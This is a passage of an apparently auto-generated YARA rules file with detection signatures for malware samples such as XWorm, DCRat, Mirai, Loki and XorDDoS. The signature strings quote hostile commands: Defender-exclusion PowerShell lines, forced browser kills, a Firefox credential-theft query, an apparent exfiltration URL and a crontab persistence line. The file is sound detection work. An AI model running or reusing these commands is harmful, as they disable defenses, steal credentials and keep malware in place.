      $s3 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s4 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s6 = "            compatibility then delete the requestedExecutionLevel node." fullword ascii /* score: '14.00'*/
      $s7 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s8 = "most compatible environment.-->" fullword ascii /* score: '12.00'*/
      $s9 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s10 = "            Specifying requestedExecutionLevel node will disable file and registry virtualization." fullword ascii /* score: '11.00'*/
      $s11 = "            requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s14 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s15 = "          processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule Mirai_signature__3fcb3e3a {
   meta:
      description = "dropzone - file Mirai(signature)_3fcb3e3a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3fcb3e3a93b02ed9152b48f266b490064319830bf34f33a9d56762e7bea9d0db"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__3ea9b80c {
   meta:
      description = "dropzone - file Mirai(signature)_3ea9b80c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3ea9b80c5d3abe1f701fd3214b588fdf0de5a3e9346595245cc2b520a93c3c72"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for x86_64" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__9cb85702 {
   meta:
      description = "dropzone - file Mirai(signature)_9cb85702.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9cb857025124583dc85de8816d075e288a84690cab4475896bec7a1a6da28692"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for x86_64" fullword ascii /* score: '17.50'*/
      $s2 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s3 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd71110a {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd71110a.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dd71110a6b7fb79b2949280611957646f76503f1bda866b06e74b9a74e54dc89"
   strings:
      $x1 = "C:\\Users\\Professor\\Desktop\\BitJoiner\\payload\\obj\\Debug\\payload.pdb" fullword ascii /* score: '42.00'*/
      $x2 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" fullword wide /* score: '39.00'*/
      $x3 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x4 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x5 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x6 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x7 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $x8 = "payload.exe" fullword wide /* score: '31.00'*/
      $x9 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" fullword wide /* score: '31.00'*/
      $x10 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s11 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s12 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s13 = "RDxDfuqVkkLBQm5DxNH.oTNe2mqpxJ7hV6uF1Ir+L8NfWmqIIC4SmMWto77+PaaoUqq0bBNnmbDLPfH`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s14 = "Discord - https://discord.com/" fullword wide /* score: '25.00'*/
      $s15 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      8 of ($x*) and all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f6739bf519804e3746d8dac4a0342e4786064f473121ed14e7ed06d150400e54"
   strings:
      $x1 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" fullword wide /* score: '39.00'*/
      $x2 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" fullword wide /* score: '31.00'*/
      $x3 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s4 = "SHCore.dll" fullword ascii /* score: '23.00'*/
      $s5 = "NTdll.dll" fullword ascii /* score: '23.00'*/
      $s6 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s7 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s8 = "XClient.exe" fullword wide /* score: '22.00'*/
      $s9 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s11 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s12 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s13 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
      $s14 = "e1DuMP9oVLCE7CI" fullword ascii /* score: '14.00'*/
      $s15 = "\\drivers\\etc\\hosts" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      2 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4e378740 {
   meta:
      description = "dropzone - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4e378740.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4e378740e132d999256cd8c9c23e3b7fbd970d43fe940ef290bc139a6405f620"
   strings:
      $x1 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s2 = "SHCore.dll" fullword ascii /* score: '23.00'*/
      $s3 = "NTdll.dll" fullword ascii /* score: '23.00'*/
      $s4 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s5 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s6 = "Dekont.exe" fullword wide /* score: '22.00'*/
      $s7 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s8 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s9 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s10 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s11 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
      $s12 = "\\drivers\\etc\\hosts" fullword wide /* score: '13.00'*/
      $s13 = "EXECUTION_STATE" fullword ascii /* score: '12.00'*/
      $s14 = "POST / HTTP/1.1" fullword wide /* score: '12.00'*/
      $s15 = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Saf" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c29b8c08 {
   meta:
      description = "dropzone - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c29b8c08.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c29b8c089386c964ea2f63e79e78fc57abbe732b3b8366827218858b0ed7c256"
   strings:
      $x1 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" fullword wide /* score: '39.00'*/
      $x2 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" fullword wide /* score: '31.00'*/
      $x3 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s4 = "Discord - https://discord.com/" fullword wide /* score: '25.00'*/
      $s5 = "SHCore.dll" fullword ascii /* score: '23.00'*/
      $s6 = "NTdll.dll" fullword ascii /* score: '23.00'*/
      $s7 = "DiscordScreen.exe" fullword wide /* score: '22.00'*/
      $s8 = "http://ip-api.com/line/?fields=hosting" fullword wide /* score: '22.00'*/
      $s9 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s10 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s11 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s12 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s13 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s14 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s15 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      2 of ($x*) and 10 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c7f4e1ab {
   meta:
      description = "dropzone - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
   strings:
      $x1 = "cmd.exe /c start %TARGETOSDRIVE%\\Recovery\\OEM\\" fullword wide /* score: '53.00'*/
      $x2 = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F" fullword wide /* score: '52.00'*/
      $x3 = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F" fullword wide /* score: '52.00'*/
      $x4 = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F" fullword wide /* score: '47.00'*/
      $x5 = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F" fullword wide /* score: '47.00'*/
      $x6 = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F" fullword wide /* score: '47.00'*/
      $x7 = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F" fullword wide /* score: '47.00'*/
      $x8 = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F" fullword wide /* score: '47.00'*/
      $x9 = "Conhost --headless cmd.exe /c start firefox --profile=\"" fullword wide /* score: '46.00'*/
      $x10 = "Conhost --headless cmd.exe /c start \"\" \"" fullword wide /* score: '46.00'*/
      $x11 = "costura.gma.system.mousekeyhook.dll.compressed|5.7.1.0|Gma.System.MouseKeyHook, Version=5.7.1.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x12 = "C:\\Users\\Professor\\Desktop\\BitJoiner\\payload\\obj\\Debug\\payload.pdb" fullword ascii /* score: '42.00'*/
      $x13 = "costura.gma.system.mousekeyhook.dll.compressed|5.7.1.0|Gma.System.MouseKeyHook, Version=5.7.1.0, Culture=neutral, PublicKeyToken" ascii /* score: '42.00'*/
      $x14 = "c:\\windows\\system32\\dllhost.exe" fullword wide /* score: '42.00'*/
      $x15 = "costura.naudio.winmm.dll.compressed|2.2.1.0|NAudio.WinMM, Version=2.2.1.0, Culture=neutral, PublicKeyToken=e279aa5131008a41|NAud" ascii /* score: '41.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      10 of ($x*)
}


rule Mirai_signature__01b09801 {
   meta:
      description = "dropzone - file Mirai(signature)_01b09801.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_destroy.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s9 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s11 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s12 = "is_protected_process" fullword ascii /* score: '15.00'*/
      $s13 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s14 = "attack_bypass.c" fullword ascii /* score: '15.00'*/
      $s15 = "gethostname.c" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      8 of them
}

rule Mirai_signature__ce7aaa40 {
   meta:
      description = "dropzone - file Mirai(signature)_ce7aaa40.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_destroy.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s9 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s11 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s12 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s13 = "attack_bypass.c" fullword ascii /* score: '15.00'*/
      $s14 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s15 = "hexPayload" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      8 of them
}

rule Mirai_signature__e1872b44 {
   meta:
      description = "dropzone - file Mirai(signature)_e1872b44.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e1872b44f151615dd30c9120e8d8bd8d477212b7188a79478af49ff7df6610a9"
   strings:
      $s1 = "uvldobj" fullword ascii /* score: '8.00'*/
      $s2 = "abcdefghijklmnoo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule GCleaner_signature__40c6fa0bae4a4073700c5b83b959e25e_imphash_ {
   meta:
      description = "dropzone - file GCleaner(signature)_40c6fa0bae4a4073700c5b83b959e25e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "05664da4d3ea8b39b6183a1112e67f46a8715536faa0a9469bc2659f4ef16289"
   strings:
      $s1 = " http://crl.verisign.com/pca3.crl0" fullword ascii /* score: '13.00'*/
      $s2 = "EComponentError0FA" fullword ascii /* score: '10.00'*/
      $s3 = "Common Engineering Services1" fullword ascii /* score: '10.00'*/
      $s4 = ":.:6:@:E:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'n' */
      $s5 = ":&;*;.;2;6;<;" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s6 = "EVariantBadVarTypeError0" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2f0ff1a3 {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f0ff1a3.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2f0ff1a3573cb45775b709b1e8df418ff7adcc5b678a52a768d02933b6174ca6"
   strings:
      $x1 = "sechost.dll" fullword ascii /* reversed goodware string 'lld.tsohces' */ /* score: '38.00'*/
      $x2 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x3 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x4 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x5 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x6 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s7 = "runtimeMonitordll.exe" fullword ascii /* score: '30.00'*/
      $s8 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s9 = "\"C:\\BridgeChainComponentBrowserMonitor\\runtimeMonitordll.exe\"f" fullword ascii /* score: '28.00'*/
      $s10 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s11 = "fHPklmlj6HewhT5Drq4.vvNrEUlQSBFZR9oaxh1+gjLmFGlsRyI2KjdX0Gw+QsHUuulXnOVJw2HJvYY`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s12 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s13 = "MasonRootkit.exe" fullword wide /* score: '25.00'*/
      $s14 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s15 = "UXTheme.dll" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__b8bf08fa843a9ec1ce10d80fbf550c26_imphash_ {
   meta:
      description = "dropzone - file ValleyRAT(signature)_b8bf08fa843a9ec1ce10d80fbf550c26(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "24be5daba220b38da8686b3211d66c7cfa78185cdddf7cf24d014e7ea1df34a1"
   strings:
      $s1 = "Windows\\System32\\tracerpt.exe" fullword ascii /* score: '23.00'*/
      $s2 = "Windows\\SysWOW64\\tracerpt.exe" fullword ascii /* score: '15.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "%s-%04d%02d%02d-%02d%02d%02d.dmp" fullword wide /* score: '9.50'*/
      $s5 = ".?AVCKernelManager@@" fullword ascii /* score: '9.00'*/
      $s6 = "denglupeizhi" fullword ascii /* score: '8.00'*/
      $s7 = "!analyze -v" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "dropzone - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5b7c8179596c522c2888541d72a0859c0822e8f2f0191671239d94e721bdb624"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "EYeH/U0t" fullword ascii /* score: '9.00'*/
      $s6 = "* \\z]aH" fullword ascii /* score: '9.00'*/
      $s7 = "QgzP9y}* " fullword ascii /* score: '8.00'*/
      $s8 = "oYhl!." fullword ascii /* score: '8.00'*/
      $s9 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s10 = "uuuijos" fullword ascii /* score: '8.00'*/
      $s11 = "E=yQiw+ Q" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule ValleyRAT_signature__884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "dropzone - file ValleyRAT(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6d0f4700ed858579f671c820e4c6a452ceea83a2218b638323a5048c1a2da701"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "5 /h e" fullword ascii /* score: '9.00'*/
      $s6 = "dsCgETk" fullword ascii /* score: '9.00'*/
      $s7 = "* DOU>" fullword ascii /* score: '9.00'*/
      $s8 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      all of them
}

rule ValleyRAT_signature__fb51ede541a9ad63bf23d302e319d2a0_imphash_ {
   meta:
      description = "dropzone - file ValleyRAT(signature)_fb51ede541a9ad63bf23d302e319d2a0(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "fd4100a36baa4b1cf07362545da993eaadddf6d17c07cc4c0fdd4655cf604a2e"
   strings:
      $s1 = "Windows\\System32\\tracerpt.exe" fullword ascii /* score: '23.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s3 = "%s-%04d%02d%02d-%02d%02d%02d.dmp" fullword wide /* score: '9.50'*/
      $s4 = ".?AVCKernelManager@@" fullword ascii /* score: '9.00'*/
      $s5 = "denglupeizhi" fullword ascii /* score: '8.00'*/
      $s6 = "!analyze -v" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash_ {
   meta:
      description = "dropzone - file Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "44643df29551a463002fdf0a4eb38b8e6dce0f7054eda1b4383f96a12fe54945"
   strings:
      $s1 = "SELECT encryptedUsername, encryptedPassword, formSubmitURL, hostname FROM moz_logins" fullword ascii /* score: '25.00'*/
      $s2 = "sCrypt32.dll" fullword wide /* score: '23.00'*/
      $s3 = "SmtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s4 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s5 = "FtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "%s\\%s%i\\data\\settings\\ftpProfiles-j.jsd" fullword wide /* score: '21.50'*/
      $s7 = "aPLib v1.01  -  the smaller the better :)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "%s\\%s\\User Data\\Default\\Login Data" fullword wide /* score: '20.50'*/
      $s9 = "http://infouploads.com/zagala/fre.php" fullword ascii /* score: '19.00'*/
      $s10 = "%s%s\\Login Data" fullword wide /* score: '19.00'*/
      $s11 = "%s%s\\Default\\Login Data" fullword wide /* score: '19.00'*/
      $s12 = "%s\\32BitFtp.TMP" fullword wide /* score: '19.00'*/
      $s13 = "%s\\GoFTP\\settings\\Connections.txt" fullword wide /* score: '19.00'*/
      $s14 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook" fullword wide /* score: '18.00'*/
      $s15 = "%s\\Mozilla\\SeaMonkey\\Profiles\\%s" fullword wide /* score: '17.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule XorDDoS_signature_ {
   meta:
      description = "dropzone - file XorDDoS(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5fefeaf30b8cd96607ee013a771c619d2bcba75e294f57e98ba86e8b40e51090"
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)" fullword ascii /* score: '23.00'*/
      $s2 = "sed -i '/\\/etc\\/cron.hourly\\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab" fullword ascii /* score: '22.00'*/
      $s3 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s4 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s5 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii /* score: '17.50'*/
      $s6 = "/usr/libexec/getconf" fullword ascii /* score: '17.00'*/
      $s7 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s8 = "*** stack smashing detected ***: %s terminated" fullword ascii /* score: '15.00'*/
      $s9 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s10 = "# Short-Description:" fullword ascii /* score: '14.00'*/
      $s11 = "# description: %s" fullword ascii /* score: '14.00'*/
      $s12 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s13 = "TLS generation counter wrapped!  Please report as described in <http://www.gnu.org/software/libc/bugs.html>." fullword ascii /* score: '13.00'*/
      $s14 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii /* score: '12.50'*/
      $s15 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

import "pe"

rule XWorm_hybrid_cautious_f34d5f2d4577ed6d9ceec516c1f5a744_7d8c239e
{
  meta:
    description = "Hybrid: XWorm sample 7d8c239e — file path (PE+size+core) OR memory path (defined(pe)+core) OR imphash-assisted"
    imphash = "f34d5f2d4577ed6d9ceec516c1f5a744"
    sample_sha256 = "7d8c239e569ac92ce4453b603e276b607cd4d79577d11740b8f3378729a09e2f"
    vantage = "on_disk|memory"

  strings:
    // core (yalın ve tekrar eden göstergeler)
    $core1 = "-ExecutionPolicy Bypass -File \"" ascii wide fullword
    $core2 = "OfflineKeylogger Not Enabled" ascii wide fullword
    $core3 = "CloseMutex" ascii fullword
    $core4 = "_appMutex" ascii fullword
    $core5 = "AES_Encryptor" ascii fullword
    $core6 = "shutdown.exe /f /s /t 0" ascii wide fullword
    $core7 = "shutdown.exe /f /r /t 0" ascii wide fullword

  condition:
    // Diskte: PE sihirli değeri + orijinal eşiğe yakın boyut + çekirdek dizeler
    ( uint16(0) == 0x5A4D and filesize < 90KB and 4 of ($core*) )

    or

    // İmhash destekli: tam imphash ama minimum çekirdek sinyali şart
    ( pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and 2 of ($core*) )
}


import "pe"

